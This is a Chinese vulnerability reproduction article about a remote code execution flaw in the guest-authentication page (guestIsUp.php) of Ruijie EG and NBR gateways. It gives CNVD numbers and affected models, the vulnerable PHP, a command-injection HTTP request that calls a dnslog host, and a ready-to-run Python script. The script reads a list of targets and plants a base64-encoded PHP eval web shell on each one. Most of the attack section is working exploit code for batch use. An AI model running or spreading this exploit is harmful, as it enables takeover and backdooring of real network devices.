> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8ZK3lWpwjNzo8eXsF_Swsw)

漏洞描述
----

锐捷部分网关产品 Eweb 管理系统存在代码执行漏洞，攻击者利用前端代码获得访问权限或者在设备上有开启访客认证功能（部分版本存在）、本地服务器认证功能、投屏服务功能时，可对设备进行攻击。护网的时候很火的一个漏洞，复现的有点晚了

漏洞编号
----

*   CNVD-C-2021-12252
    
*   CNVD-C-2021-08674
    
*   CNVD-C-2021-09953
    
*   CNVD-2021-09512
    
*   CNVD-2021-09650
    
*   CNVD-2021-21527
    

利用类型
----

远程

漏洞分类
----

*   网管
    
*   linux
    

适用版本
----

网关产品的 11.1(6)B21 及之后版本存在此问题。

<table width="660"><thead><tr><th><strong>NBR*</strong>* 系列 **</th><th>NBR108G-P、NBR1000G-E、NBR1300G-E、NBR1700G-E、NBR2100G-E、NBR2500D-E、NBR3000D-E、NBR6120-E、NBR6135-E、NBR6205-E、NBR6210-E、NBR6215-E、NBR800G、NBR950G、NBR1000G-C/NBR2000G-C/NBR3000G-S</th></tr></thead><tbody><tr><td><strong>EG*</strong>* 系列 **</td><td>RG-EG1000C、RG-EG2000F、RG-EG2000K、RG-EG2000L、RG-EG2000CE、 RG-EG2000SE、RG-EG2000GE、RG-EG2000XE、RG-EG2000UE、RG-EG3000CE、RG-EG3000SE、RG-EG3000GE、RG-EG3000ME、RG-EG3000UE、RG-EG3000XE、RG-EG2100-P、EG3210、EG3220、EG3230、EG3250</td></tr></tbody></table>

标签
--

*   Linux
    
*   RCE
    

发布日期
----

2021.01

漏洞等级
----

高危

漏洞原理
----

guestIsUp.php

```
<?php
  //查询用户是否上线了
  $userip = @$_POST['ip'];
  $usermac = @$_POST['mac'];
   
  if (!$userip || !$usermac) {
      exit;
  }
  /* 判断该用户是否已经放行 */
  $cmd = '/sbin/app_auth_hook.elf -f ' . $userip;
  $res = exec($cmd, $out, $status);
  /* 如果已经上线成功 */
  if (strstr($out[0], "status:1")) {
      echo 'true';
  }
?>
```

```
POST /guest_auth/guestIsUp.php HTTP/1.1
Host: 192.168.10.1
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 56


mac=1&ip=127.0.0.1|curl xxx.dnslog.cn
```

简单的命令执行绕过

漏洞利用
----

### 利用脚本

```
import requests
import sys
import urllib3
import random
urllib3.disable_warnings()

def main(targets):
  ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
  header = {
      "user-agent":ua
  }
  shellcontent = "PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==" # cat shell.php | base64
  # shellcontent = "PD9waHAgcGhwaW5mbygpOz8+"
  with open(targets) as f:
      for target in f.readlines():
          target = target.strip()
          url = target + "/guest_auth/guestIsUp.php"
          shellname = str(random.randrange(8888,9999))+'.php'
          data = 'ip=127.0.0.1|echo "'+shellcontent+'"|base64 -d > '+shellname+'&mac=00-00'
          try:
              requests.post(url,data=data,headers= {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","user-agent":ua},verify=False,timeout=5)
          except:
              #print("timeout")
              continue
          url = target + '/guest_auth/'+shellname
          if(requests.get(url,headers=header,verify=False).status_code==200):
              print(url)
          else:
              pass
              print("fail")
              # fail
if __name__ == "__main__":
  if(len(sys.argv)==2):
      targets = sys.argv[1]
      main(targets)
  else:
      print("usage: python3 eg.py urls.txt")
```

### 利用方法

```
python3 eg.py urls.txt
```

### 利用过程

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MUl5YJGLW2cxas4D0sD9nlvLJHetPIyYJibtCMQBxJn5geApHg63FFWV1FxlJGxFgicW1jwGOM4ib5Xw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MUl5YJGLW2cxas4D0sD9nlvxLPgPtaDpNU1bgQnt4kCI4GzcMlnA1LXKgdxhVNkm3LZibuBQSBHOFg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qjS1tDsz9MUl5YJGLW2cxas4D0sD9nlvAEPbzKZqsghxFxlHmNDbibhO8nAMorVX0knGl7yJ6aicCjJia3guCACFw/640?wx_fmt=png)

参考链接
----

*   https://www.seebug.org/vuldb/ssvid-99106
    
*   https://github.com/heikanet/EgGateWayGetShell